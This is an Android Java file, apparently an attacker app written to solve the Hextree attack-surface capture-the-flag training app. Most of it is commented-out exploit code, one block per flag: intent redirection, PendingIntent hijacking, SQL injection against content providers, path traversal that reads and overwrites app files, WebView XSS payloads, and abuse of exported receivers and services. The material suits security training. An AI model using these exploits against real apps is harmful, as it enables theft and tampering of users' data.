package io.hextree.androidtest;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.database.Cursor;
import android.net.Uri;
import android.app.Dialog;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.os.SystemClock;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;

import io.hextree.attacksurface.services.IFlag28Interface;
import io.hextree.attacksurface.services.IFlag29Interface;


public class MainActivity extends AppCompatActivity {
    Dialog dialog;


////////////////////////////////////////////////////////////////Flag 26 service///////////////////////////////////////////////////////////
//    private final ServiceConnection serviceConnection = new ServiceConnection() {
//        @Override
//        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
//            Messenger messenger = new Messenger(iBinder); // Fixed class name
//            Message msg = Message.obtain(null, 42);
//            try {
//                messenger.send(msg); // Fixed variable name
//            } catch (RemoteException e) {
//                e.printStackTrace(); // Handle the exception properly
//            }
//        }
//        @Override
//        public void onServiceDisconnected(ComponentName componentName) {
//            // Handle disconnection if necessary
//        }
//    };
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////Flag 27 service///////////////////////////////////////////////////////////
//    private class IncommingHandler extends Handler {
//        IncommingHandler(){
//            super(Looper.getMainLooper());
//        }
//        public void handleMessage(Message msg){
//
//            Bundle bundle = msg.getData();
//            if (bundle != null) {
//                String reply = bundle.getString("reply"); // Extract reply message
//                Log.d("MSG", "Received reply: " + reply);
//            }
//
//        }
//}
//private final Messenger clientMessenger = new Messenger(new IncommingHandler());
//    private final ServiceConnection serviceConnection = new ServiceConnection() {
//        @Override
//        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
//            Messenger messenger = new Messenger(iBinder);
//            Message msg = Message.obtain(null, 3);
//            Bundle bundle = new Bundle();
//            bundle.putString("echo", "");
//            bundle.putString("password", null);
//            msg.setData(bundle);
//            msg.replyTo = clientMessenger;
//            try {
//                messenger.send(msg); // Fixed variable name
//            } catch (RemoteException e) {
//                e.printStackTrace(); // Handle the exception properly
//            }
//        }
//        @Override
//        public void onServiceDisconnected(ComponentName componentName) {
//            // Handle disconnection if necessary
//        }
//    };
//    private boolean isBound = false;
//    private final Messenger clientMessegener = new Messenger(new IncomingHandler());
//    private Messenger serviceMessenger = null;
//    private String obtainedPassword;
//    private class IncomingHandler extends Handler{
//        IncomingHandler() {super(Looper.getMainLooper());}
//        @Override
//        public void handleMessage(Message msg){
//            Bundle reply =  msg.getData();
//            obtainedPassword = reply.getString("password");
//            if(reply != null && obtainedPassword != null) {
//                Log.i("MessageReply1234", reply.toString());
//                Log.d("MessageReply1234", "Obtained password: " + obtainedPassword);
//          getFlag(obtainedPassword);
//            }
//            else{
//                Log.i("Message1234", "NO Reply");
//            }
//        }
//    }
//    private ServiceConnection connection = new ServiceConnection() {
//        @Override
//        public void onServiceConnected(ComponentName name, IBinder binder) {
//            serviceMessenger = new Messenger(binder);
//            isBound = true;
//      // Start by getting the secret
//            requestPassword();
//        }
//        @Override
//        public void onServiceDisconnected(ComponentName name) {
//        }
//    };
//    // Method to request the password
//    private void requestPassword() {
//        if (!isBound) return;
//        Message msg = Message.obtain(null, 2);
//        msg.obj = new Bundle();
//        msg.replyTo = clientMessegener;
//        try {
//            serviceMessenger.send(msg);
//        } catch (RemoteException e) {
//            e.printStackTrace();
//        }
//    }
//    // Method to request the flag
//    private void getFlag(String Password) {
//    // First, send "give flag" echo**
//        Message msg = Message.obtain(null, 1);
//        Bundle bundle = new Bundle();
//        bundle.putString("echo", "give flag");
//        msg.setData(bundle);
//        msg.replyTo = clientMessegener;
//        try {
//            serviceMessenger.send(msg);
//        } catch (RemoteException e) {
//            e.printStackTrace();
//        }
//    // Now, send the retrevied password with int = 3 to get flag**
//        msg = Message.obtain(null, 3);
//        bundle = new Bundle();
//        bundle.putString("password", Password);
//        msg.setData(bundle);
//        msg.replyTo = clientMessegener;
//        try {
//            serviceMessenger.send(msg);
//        } catch (RemoteException e) {
//            e.printStackTrace();
//        }
//    }
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

//        Button button = findViewById(R.id.button);
//    button.setOnClickListener(new View.OnClickListener() {
//    @Override
//    public void onClick(View v) {

        ////////////////////////////////////////////////////////////////Flag 5///////////////////////////////////////////////////////////
        //                Intent nestedIntent = new Intent();
        //                nestedIntent.putExtra("return", 42);
        //
        //                Intent nextIntent = new Intent();
        //                nextIntent.putExtra("reason", "back");
        //
        //                nestedIntent.putExtra("nextIntent", nextIntent);
        //
        //                Intent exploitIntent = new Intent();
        //                exploitIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
        //                exploitIntent.putExtra("android.intent.extra.INTENT", nestedIntent);
        //
        //                startActivity(exploitIntent);
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



        //////////////////////////////////////////////////////////////////Flag 6///////////////////////////////////////////////////////////
        //                am start -n io.hextree.attacksurface/.activities.Flag6Activity --grant-read-uri-permission >> additional solution.
        //                Intent nestedIntent = new Intent();
        //                nestedIntent.putExtra("return", 42);
        //
        //                Intent nextIntent = new Intent();
        //                nextIntent.putExtra("reason", "next");
        //                nextIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
        //                nestedIntent.putExtra("nextIntent", nextIntent);
        //                Intent exploitIntent = new Intent();
        //                exploitIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
        //                exploitIntent.putExtra("android.intent.extra.INTENT", nestedIntent);
        //                nextIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        //
        //                startActivity(exploitIntent);
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



        ////////////////////////////////////////////////////////////////Flag 7///////////////////////////////////////////////////////////



        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////




        ////////////////////////////////////////////////////////////////Flag 8///////////////////////////////////////////////////////////
        //                Intent intent = new Intent(MainActivity.this,HextreeActivity.class);
        //                startActivity(intent);
        ///////////frida_snippet for debugging
        //                Java.perform(function() {
        //                    var ComponentName = Java.use("android.content.ComponentName");
        //
        //                    ComponentName.getClassName.implementation = function() {
        //                        var result = this.getClassName(); // Call original method
        //                        console.log("[+] getClassName() called, returned: " + result);
        //
        //                        return result; // Return the original result
        //                    };
        //                });
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





        ////////////////////////////////////////////////////////////////Flag 9///////////////////////////////////////////////////////////
        //                Intent intent = new Intent(MainActivity.this,HextreeActivity.class);
        //                startActivity(intent);
        //see the code in Hextree activity
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////




        ////////////////////////////////////////////////////////////////Flag 10/////////////////////////////////////////////////////////
        // just create an intent filter
        //see the content of AndroidManifest file
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////




        ////////////////////////////////////////////////////////////////Flag 11/////////////////////////////////////////////////////////
        //see the code in secondActivity
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////






        ////////////////////////////////////////////////////////////////Flag 12/////////////////////////////////////////////////////////
        //                Intent exploitIntent = new Intent();
        //                exploitIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity"));
        //                exploitIntent.putExtra("LOGIN", true);
        //                startActivity(exploitIntent);
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////








        //////////////////////////////////////////////////////////////////Flag 22/////////////////////////////////////////////////////////
        //                Intent targetIntent = new Intent();
        //                targetIntent.setClass(getApplicationContext(),  SecondActivity.class);
        //                PendingIntent pendingIntent = PendingIntent.getActivity(getApplicationContext(),0,targetIntent, PendingIntent.FLAG_MUTABLE);
        //                System.out.println(pendingIntent);
        //                Intent sendIntent = new Intent();
        //                sendIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity");
        //                sendIntent.putExtra("PENDING", pendingIntent);
        //                startActivity(sendIntent);
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////







        //////////////////////////////////////////////////////////////////Flag 23/////////////////////////////////////////////////////////
        // adb root;adb shell am start -n io.hextree.attacksurface/.activities.Flag23Activity -a io.hextree.attacksurface.GIVE_FLAG --ei code 42
        //the above exploit is out of scope as it will use root to spawn the activity, and it won't be a valid exploit
        //                Intent receivedIntent = getIntent();
        //                PendingIntent pendingIntent = receivedIntent.getParcelableExtra("pending_intent");
        //                Intent newIntent = new Intent();
        //                newIntent.setAction("io.hextree.attacksurface.GIVE_FLAG");
        //                newIntent.putExtra("code", 42);
        //
        //                try {
        //                    pendingIntent.send(getApplicationContext(), 0, newIntent);
        //                } catch (PendingIntent.CanceledException e) {
        //                    e.printStackTrace();
        //                }
        //            }
        //        });
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////






        ////////////////////////////////////////////////////////////////Flag 14/////////////////////////////////////////////////////////
        //        Intent intent = new Intent();
        //        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag14Activity");
        //        startActivity(intent);
        //
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////






        //////////////////////////////////////////////////////////////////Flag 15/////////////////////////////////////////////////////////
        //        Intent intent2 = new Intent("android.intent.action.VIEW");
        //        intent2.setData(Uri.parse("https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=" + Uri.encode("intent:#Intent;action=io.hextree.action.GIVE_FLAG;S.action=flag;B.flag=true;end;")));
        //        startActivity(intent2);
        //        unintented solution for flag 15 :
        //        Intent intent = new Intent();
        //        intent.setAction("io.hextree.action.GIVE_FLAG");
        //        intent.addCategory("android.intent.category.BROWSABLE");
        //        intent.putExtra("com.android.browser.application_id", "123344");  // Changed to String
        //        Bundle extras = new Bundle();
        //        extras.putString("action", "flag");
        //        extras.putBoolean("flag", true);
        //        intent.putExtras(extras);
        //        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag15Activity");
        //        startActivity(intent);
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////




        //////////////////////////////////////////////////////////////////Flag 30/////////////////////////////////////////////////////////
        // adb shell content query --uri content://io.hextree.flag30/success
        //        Cursor cursor = getContentResolver().query(
        //                Uri.parse("content://io.hextree.flag30/success"),
        //                null, null,
        //                null, null
        //        );
        ////    dump Uri
        //        if (cursor!=null && cursor.moveToFirst()) {
        //            do {
        //                StringBuilder sb = new StringBuilder();
        //                for (int i = 0; i < cursor.getColumnCount(); i++) {
        //                    if (sb.length() > 0) {
        //                        sb.append(", ");
        //                    }
        //                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
        //                }
        //                Log.d("evil", sb.toString());
        //            } while (cursor.moveToNext());
        //        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





        //////////////////////////////////////////////////////////////////Flag 31/////////////////////////////////////////////////////////
        // adb shell content query --uri content://io.hextree.flag31/flag/31
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





        //////////////////////////////////////////////////////////////////Flag 32/////////////////////////////////////////////////////////
        // adb shell content query --uri content://io.hextree.flag32/flags --where 'visible=0) union select * FROM Flag --'
        //        Cursor cursor = getContentResolver().query(
        //                Uri.parse("content://io.hextree.flag32/flags"),
        //                null, "visible=0) union select * from Flag;",
        //                null, null
        //        );
        //        if (cursor!=null && cursor.moveToFirst()) {
        //            do {
        //                StringBuilder sb = new StringBuilder();
        //                for (int i = 0; i < cursor.getColumnCount(); i++) {
        //                    if (sb.length() > 0) {
        //                        sb.append(", ");
        //                    }
        //                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
        //                }
        //                Log.d("evil", sb.toString());
        //            } while (cursor.moveToNext());
        //        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





        ////////////////////////////////////////////////////////////// flag33_1 ////////////////////////////////////////////////////////
        //content query --uri  content://io.hextree.flag33_1/flags --projection '* from sqlite_master-- -'
        //content query --uri  content://io.hextree.flag33_1/flags --projection '* from Note-- -'
        //        Intent intent = new Intent();
        //        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity1");
        //        //intent.putExtra("secret","هات الفلاج ");
        //        intent.setAction("io.hextree.FLAG33");
        //        startActivityForResult(intent,1);
        //        // see this at the top of the mainactivity, to see the actions will happend after getting result
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





        ////////////////////////////////////////////////////////////// flag34 ////////////////////////////////////////////////////////
        //        Intent intent = new Intent();
        //        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity");
        //        intent.putExtra("filename","../files/flags/flag34.txt"); //content://io.hextree.files/other_files/files/flags/flag34.txt
        //        startActivityForResult(intent,42); // see this at the top of the mainactivity, to see the actions will happend after getting result
        //        emu64a:/data/data/io.hextree.attacksurface # cat files/flags/flag34.txt
        //        HXT{sharing-***************-av27s}
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////






        ////////////////////////////////////////////////////////////// flag35 ////////////////////////////////////////////////////////
        //        Intent intent = new Intent();
        //        intent.putExtra("filename","../flag35.txt");
        //        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity"));
        //        startActivityForResult( // see this at the top of the mainactivity, to see the actions will happend after getting result
        //                intent,42
        //        );
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





        ////////////////////////////////////////////////////////////// flag36 ////////////////////////////////////////////////////////
        //        Intent intent = new Intent();
        //        intent.putExtra("filename","../shared_prefs/Flag36Preferences.xml");
        //        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity"));
        //        startActivityForResult(// see this at the top of the mainactivity, to see the actions will happend after getting result
        //                intent,42
        //        );
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





        ////////////////////////////////////////////////////////////// flag38 ////////////////////////////////////////////////////////
        //        Intent intent = new Intent();
        //        intent.putExtra("URL","data:text/html,<script>hextree.success(true);</script>");
        //        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag38WebViewsActivity");
        //        startActivity(intent);
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





        ////////////////////////////////////////////////////////////// flag39 ////////////////////////////////////////////////////////
        //        am start -n io.hextree.attacksurface/.webviews.Flag39WebViewsActivity --es "NAME" "<img src=1 onerror=window.hextree.success()>"
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////




        //////////////////////////////////////////////////////// flag16 reciever ////////////////////////////////////////////////////////
        //        Intent intent = new Intent();
        //        intent.putExtra("flag","give-flag-16");
        //        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag16Receiver");
        //        intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
        //        sendBroadcast(intent);
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





        /////////////////////////////////////////////////////// flag17 reciever ////////////////////////////////////////////////////////
        // u will see the flag in logcat
        //        Intent intent = new Intent();
        //        intent.putExtra("flag", "give-flag-17");
        //        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver");
        //        intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
        //        BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
        //            @Override
        //            public void onReceive(Context context, Intent intent) {
        //                String result = getResultData();
        //                Bundle result2 = getResultExtras(false);
        //                Log.d("Recieved :", result);
        //                Log.d("Recieved :", String.valueOf(result2));
        //            }
        //        };
        //      sendOrderedBroadcast(intent, null);
        //    }
        //    });
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////






        ///////////////////////////////////////////////flag 18//////////////////////////////////////////////////////////////////////////
        //  BroadcastReceiver receiver = new MyReceiver();
        //  IntentFilter filter = new IntentFilter("io.hextree.broadcast.FREE_FLAG");
        //  registerReceiver(receiver,filter,RECEIVER_EXPORTED);
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////






        ///////////////////////////////////////////////////////////flag 19///////////////////////////////////////////////////////////////
        //  Intent intent = new Intent();
        //  intent.setAction("test.test.test.APPWIDGET_UPDATE");
        //  intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag19Widget");
        //  Bundle bundle = new Bundle();
        //  bundle.putInt("appWidgetMaxHeight", 1094795585);
        //  bundle.putInt("appWidgetMinHeight", 322376503);
        //  intent.putExtra("appWidgetOptions", bundle);
        //  sendBroadcast(intent);
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////






        ////////////////////////////////////////////////////flag 20 reciever ///////////////////////////////////////////////////////////////////
        //    Intent intent = new Intent("io.hextree.broadcast.GET_FLAG");
        //    intent.putExtra("give-flag", true);
        //    sendBroadcast(intent);
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////







        ////////////////////////////////////////////////////flag 21 reciever ///////////////////////////////////////////////////////////////////
        // just click on the GIVE FLAG button and see logcat
        //    BroadcastReceiver broadcastReceiver = new MyReceiver2();
        //    IntentFilter intentFilter = new IntentFilter("io.hextree.broadcast.GIVE_FLAG");
        //    registerReceiver(broadcastReceiver,intentFilter,RECEIVER_EXPORTED);
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////









        ////////////////////////////////////////////////////////////// Flag24 ////////////////////////////////////////////////////////
        //        Intent intent = new Intent("io.hextree.services.START_FLAG24_SERVICE");
        //        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service"));
        //        startService(intent);
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////








        ////////////////////////////////////////////////////////////// Flag25 ////////////////////////////////////////////////////////
        //        Intent intent1 = new Intent();
        //        intent1.setAction("io.hextree.services.UNLOCK1");
        //        intent1.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service"));
        //        startService(intent1);
        //        Intent intent2 = new Intent();
        //        intent2.setAction("io.hextree.services.UNLOCK2");
        //        intent2.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service"));
        //        startService(intent2);
        //        Intent intent3 = new Intent();
        //        intent3.setAction("io.hextree.services.UNLOCK3");
        //        intent3.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service"));
        //        startService(intent3);
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////




        ////////////////////////////////////////////////////////////// Flag26 service////////////////////////////////////////////////////
        //        Intent intent = new Intent();
        //        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service"));
        //        // don't forget to see the serviceConnection at the top of the MainActivity
        //        bindService(intent,serviceConnection,Context.BIND_AUTO_CREATE);
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





        ////////////////////////////////////////////////////////////// Flag27 service /////////////////////////////////////////////////////
        //        Intent intent = new Intent();
        //        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service"));
        //        // don't forget to see the connection at the top of the MainActivity
        //        bindService(intent,connection,Context.BIND_AUTO_CREATE);
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////






        //////////////////////////////////////////////////////////////// Flag28 service ////////////////////////////////////////////////////////
        //        Intent intent = new Intent();
        //        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service"));
        //        ServiceConnection connection = new ServiceConnection() {
        //            @Override
        //            public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
        //               //aidl services is defined in .aidl file located in src/main/aidl/attacksurface.services, don't forget to see
        //                IFlag28Interface ser = IFlag28Interface.Stub.asInterface(iBinder);
        //                try {
        //                    ser.openFlag();
        //                } catch (RemoteException e) {
        //                    throw new RuntimeException(e);
        //                }
        //            }
        //            @Override
        //            public void onServiceDisconnected(ComponentName componentName) {
        //            }
        //        };
        //        bindService(intent,connection,Context.BIND_AUTO_CREATE);
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////




        //////////////////////////////////////////////////////////////// Flag29 service ////////////////////////////////////////////////////////
        //        Intent intent = new Intent();
        //        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag29Service"));
        //        ServiceConnection connection = new ServiceConnection() {
        //            @Override
        //            public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
        //                IFlag29Interface ser = IFlag29Interface.Stub.asInterface(iBinder);
        //               //aidl services is defined in .aidl file located in src/main/aidl/attacksurface.services, don't forget to see
        //                try {
        //                    String result = ser.init();
        //                    Log.d("AIDLClient", "Result from init(): " + result);
        //                    ser.authenticate(result);
        //                    ser.success();
        //                } catch (RemoteException e) {
        //                    throw new RuntimeException(e);
        //                }
        //            }
        //            @Override
        //            public void onServiceDisconnected(ComponentName componentName) {
        //            }
        //        };
        //        bindService(intent,connection,Context.BIND_AUTO_CREATE);
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }




        ////////////////////////////////////////////////////////////// flag33_1 ////////////////////////////////////////////////////////
        //    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        //        try {
        //            super.onActivityResult(requestCode, resultCode, data);
        //
        //            String payload = " *  FROM note--";
        //            String[] selectionArgs = new String[]{payload};
        //            Cursor cursor = getContentResolver().query(data.getData(),selectionArgs,null,null,null,null);
        //
        //            if (cursor!=null && cursor.moveToFirst()) {
        //            do {
        //                StringBuilder sb = new StringBuilder();
        //                for (int i = 0; i < cursor.getColumnCount(); i++) {
        //                    if (sb.length() > 0) {
        //                        sb.append(", ");
        //                    }
        //                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
        //                }
        //                Log.d("evil", sb.toString());
        //            } while (cursor.moveToNext());
        //        }
        //
        //        } catch (Exception ex) {
        //            Log.d("Error : ",ex.toString());
        //        }
        // }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////






        ////////////////////////////////////////////////////////////// flag34 ////////////////////////////////////////////////////////
        //                        //    Java.perform(function () {
        //                        //        var Intent = Java.use("android.content.Intent");
        //                        //
        //                        //        Intent.setData.implementation = function (param1) {
        //                        //            send("Intercepted setData call!");
        //                        //            send("param1: " + param1.toString());
        //                        //
        //                        //            var result = this.setData(param1);
        //                        //            return result;
        //                        //        };
        //                        //    });
        //                        // the above script is a frida snippet i used for some debugging when i was exploit, not related to java code
        //
        //    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        //        try {
        //            super.onActivityResult(requestCode, resultCode, data);
        //
        //            Log.d("data : ",(data.getData()).toString()); //content://io.hextree.files/other_files/files/flags/flag34.txt
        //            InputStream inputStream = getContentResolver().openInputStream(data.getData());//adb logcat | grep -i "flag :"
        //            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        //            String line;
        //            while ((line = reader.readLine()) != null){
        //                Toast.makeText(getApplicationContext(),"Text : " + line, Toast. LENGTH_LONG);
        //                Log.d("Flag : ",line.toString());
        //            }
        //        } catch (Exception ex) {
        //            Log.d("Error : ",ex.toString());
        //        }
        // }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////







        ////////////////////////////////////////////////////////////// flag35 ////////////////////////////////////////////////////////
        //    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        //        try {
        //            super.onActivityResult(requestCode, resultCode, data);
        //
        //            Log.d("data : ",(data.getData()).toString());
        //            InputStream inputStream = getContentResolver().openInputStream(data.getData());
        //            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        //            String line;
        //            while ((line = reader.readLine()) != null){
        //                Toast.makeText(getApplicationContext(),"Text : " + line, Toast. LENGTH_LONG);
        //                Log.d("TEXT : ",line.toString());
        //            }
        //        } catch (Exception ex) {
        //            Log.d("Error : ",ex.toString());
        //        }
        // }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////











        ////////////////////////////////////////////////////////////// flag36 ////////////////////////////////////////////////////////
        //        protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        //        try {
        //            super.onActivityResult(requestCode, resultCode, data);
        //            String xmlData = "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n" +
        //                    "<map>\n" +
        //                    "    <boolean name=\"solved\" value=\"true\" />\n" +
        //                    "</map>";
        //            Log.d("data : ",(data.getData()).toString());
        //                try {
        //                    OutputStream outputStream = getContentResolver().openOutputStream(data.getData());
        //                    if (outputStream != null) {
        //                        outputStream.write(xmlData.getBytes(StandardCharsets.UTF_8));
        //                        outputStream.close();
        //                        Log.d("FileWrite", "File written successfully!");
        //                    }
        //                } catch (Exception e) {
        //                    throw new RuntimeException(e);
        //                }
        //        } catch (Exception ex) {
        //            Log.d("Error : ",ex.toString());
        //        }
        // }
            /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



}
